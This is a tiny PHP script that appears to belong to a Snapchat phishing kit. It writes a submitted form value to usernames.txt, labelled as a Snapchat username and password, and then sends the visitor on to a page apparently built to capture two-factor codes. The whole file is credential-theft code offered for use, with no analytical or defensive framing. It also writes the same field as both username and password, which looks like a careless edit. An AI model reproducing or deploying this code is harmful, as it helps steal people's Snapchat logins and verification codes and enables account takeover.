<?php

file_put_contents("usernames.txt", "Snapchat Username: " . $_POST['code'] . " Pass: " . $_POST['code'] . "\n", FILE_APPEND);
header('Location: snapchat-2fa.html');
exit();
?>